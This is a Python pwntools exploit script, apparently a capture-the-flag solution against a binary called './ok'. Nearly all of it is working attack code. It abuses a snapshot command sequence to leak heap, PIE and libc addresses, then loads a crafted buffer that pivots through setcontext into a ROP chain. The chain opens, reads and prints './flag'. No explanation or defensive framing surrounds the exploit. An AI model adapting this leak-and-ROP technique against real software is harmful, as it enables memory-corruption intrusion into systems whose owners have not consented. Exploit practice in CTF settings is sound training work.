#!/usr/bin/env python3
from pwn import *
import os
import re

context(os='linux', arch='amd64')

off_snapshot_hex_sink = 0xfde5
off_stdout = 0x2045c0
off_setcontext = 0x4a99d
off_pop_rdi = 0x10f78b
off_pop_rsi = 0x110a7d
off_pop_rax = 0xdd237
off_pop_rdx = 0xb505c
off_syscall_ret = 0x98fb6


def cmd(s):
    if isinstance(s, str):
        s = s.encode()
    io.sendline(s)


def load(data):
    for i in range(0, len(data), 0x180):
        cmd(b'LOAD SNAPSHOT DATA ' + data[i:i + 0x180].hex().encode())
        io.recvrepeat(0.1)


def pop_rdx(x, gadget):
    return [gadget, x, 0, 0, 0, 0]


def payload(libc, data):
    setcontext = libc + off_setcontext
    pop_rdi = libc + off_pop_rdi
    pop_rsi = libc + off_pop_rsi
    pop_rax = libc + off_pop_rax
    rdx = libc + off_pop_rdx
    syscall = libc + off_syscall_ret

    p = bytearray(0x900)
    rop_off = 0x300
    flag_off = 0x620
    buf_off = 0x700
    flag = data + flag_off
    buf = data + buf_off

    p[0xa0:0xa8] = p64(data + rop_off)
    p[0xa8:0xb0] = p64(pop_rdi)

    rop = [
        flag, pop_rsi, 0, *pop_rdx(0, rdx), pop_rax, 2, syscall,
        pop_rdi, 3, pop_rsi, buf, *pop_rdx(0x100, rdx), pop_rax, 0, syscall,
        pop_rdi, 1, pop_rsi, buf, *pop_rdx(0x100, rdx), pop_rax, 1, syscall,
        pop_rdi, 0, pop_rax, 60, syscall,
    ]

    p[rop_off:rop_off + 8 * len(rop)] = flat(rop)
    p[flag_off:flag_off + 7] = b'./flag\x00'
    p[0x830:0x838] = p64(setcontext)
    p[0x838:0x840] = p64(data)
    return bytes(p)


if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
else:
    env = {k.encode(): v.encode() for k, v in os.environ.items()}
    env[b'LD_LIBRARY_PATH'] = b'.'
    io = process([b'./ok'], env=env)

cmd('CONFIG LOG ERROR')
for _ in range(55):
    cmd('BEGIN')

cmd('COMMIT')
cmd('LOAD SNAPSHOT OPEN')
cmd('BEGIN')
cmd('DUMP SNAPSHOT')

leak = bytes.fromhex(re.search(rb'snapshot data: ([0-9a-fA-F]+)', io.recvrepeat(2)).group(1).decode())
heap = u64(leak[0x10:0x18])
sink = u64(leak[0x830:0x838])
stdout = u64(leak[0x838:0x840])

pie = sink - off_snapshot_hex_sink
libc = stdout - off_stdout
page = heap + 0x20d0
data = page + 0x20

log.info('pie  = %#x', pie)
log.info('libc = %#x', libc)
log.info('heap = %#x', page - 0x1f7a0)
log.info('data = %#x', data)

cmd('LOAD SNAPSHOT CLEAR')
io.recvrepeat(0.2)
load(payload(libc, data))
cmd('DUMP SNAPSHOT')

io.interactive()
